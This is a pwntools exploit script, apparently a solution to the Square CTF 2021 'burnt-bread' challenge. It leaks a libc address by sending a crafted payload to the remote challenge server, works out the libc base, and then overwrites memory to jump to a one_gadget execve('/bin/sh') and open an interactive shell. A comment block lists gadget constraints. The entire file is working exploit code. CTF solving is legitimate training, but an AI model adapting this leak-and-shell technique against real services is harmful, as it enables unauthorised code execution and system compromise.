from pwn import *
#p=process('./burnt-bread')
p=remote('challenges.2021.squarectf.com',7002)
elf = ELF('./burnt-bread')
#libc = ELF('libc6_2.31-17_amd64.so')


libc = ELF("libc-2.31.so")
#raw_input("DEBUG")




payload = "4f50"
payload += "11"*23+"22"
p.sendline(payload)
p.recvuntil("format: \n")
p.recvuntil("1122")
leak = p.recvuntil("\n")
print "leak: ",leak
a = "0x"
for i in range(10,-2,-2):
  a += leak[i:i+2]
_IO_stdin = int(a,16)
log.info("leak: "+hex(_IO_stdin))

base = _IO_stdin - libc.symbols['_IO_2_1_stdin_']
log.info("base: "+hex(base))

one = base + 0xe6c81
log.info("one: "+hex(one))

b=""
for i in range(12,0,-2):
  b += hex(one)[i:i+2]

payload = '4230'
payload += "11"*26
payload += str(b)
p.sendline(payload)


'''
0xcbd1a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcbd1d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcbd20 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''

p.interactive()